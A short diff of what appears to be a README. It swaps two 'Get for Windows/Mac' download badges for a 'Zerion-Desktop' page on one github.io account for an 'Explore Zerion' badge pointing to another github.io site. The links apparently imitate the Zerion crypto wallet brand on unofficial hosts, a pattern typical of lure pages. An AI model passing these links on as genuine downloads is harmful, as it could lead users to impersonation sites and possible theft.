@@ -6,8 +6,7 @@
 
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://daltonbarnettiood.github.io/.github/Zerion-Desktop)  
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://daltonbarnettiood.github.io/.github/Zerion-Desktop)
+[![Explore Zerion](https://img.shields.io/badge/Explore-Zerion-7C3AED?style=flat-square)](https://manager-zerion.github.io/.github/)
 
 </div>
 
